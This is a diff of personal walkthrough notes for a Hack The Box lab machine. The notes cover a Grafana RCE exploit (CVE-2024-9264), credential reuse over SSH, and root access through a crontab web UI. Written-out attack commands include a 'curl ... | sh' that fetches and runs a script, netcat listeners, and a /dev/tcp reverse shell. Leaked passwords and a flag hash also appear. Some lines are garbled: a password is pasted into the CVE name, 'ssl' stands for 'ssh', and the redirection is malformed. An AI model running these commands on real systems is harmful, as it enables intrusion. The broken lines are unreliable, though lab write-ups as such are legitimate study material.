@@ -23,10 +23,31 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DNS/namelist.txt -u 
 	-> found grafana.planning.htb, added to /etc/hosts
 	-> login with provided admin credentials (machine info)
 
-Grafana 11.0.0 -> vulnerability found, CVE-2024-9264-RCE-Exploit, downloaded poc.py from github, nc -lnvp 9001 and use python exploit.
+Grafana 11.0.0 -> vulnerability found, CVE-2024-9264-RCE-ExplP4ssw0rdS0pRi0T3coit, downloaded poc.py from github, nc -lnvp 9001 and use python exploit.
 	-> python3 poc.py --url http://grafana.planning.htb --username admin --password:0D5oT70Fq13EvB5r --reverse-ip 10.10.14.5 --reverse-port 9001
 
 reverse shell into docker container - found credentials in environment variable (env)
 ssh-login enzo/RioTecRANDEntANT!
-	-> found user.txt flag.
+	-> found user.txt flag
 
+Priviledge Escalation:
+downloaded linpeas.sh to local machine - transfer script 
+	->python3 -m http.server 80 #local machine
+	->curl 10.10.14.13/linpeas.sh | sh #victim
+		-> found http://127.0.0.1:8000 suspicious url - apparently crontab UI!
+found password with cat /opt/crontabs/crontab.db => P4ssw0rdS0pRi0T3c, apparently root pw for crontab UI
+
+created SSL-Tunnel to access http://localhost:8000 
+	-> ssl -L 8000:localhost:8000 enzo@10.10.11.68
+
+open http://localhost:8000 with browser and login with root/
+Crontab app allows to execute commands as with root permission. 
+
+create new crontab: bash -c 'bash -i >& /dev/tcp/10.10.16.7/4444 0>1'
+	-> IMPORTANT: check your ip-address with ip addr! The SSL tunnel creates a new IP address for you. You must use this IP-Address in the reverse shell command! Not the IP address you get from HTB!
+start netcat listener on my machine: nc -lnvp 4444
+	-> got reverse root shell
+	
+
+	
+found root.txt = 74b0783f53a6e5e8720cf15a26532a30
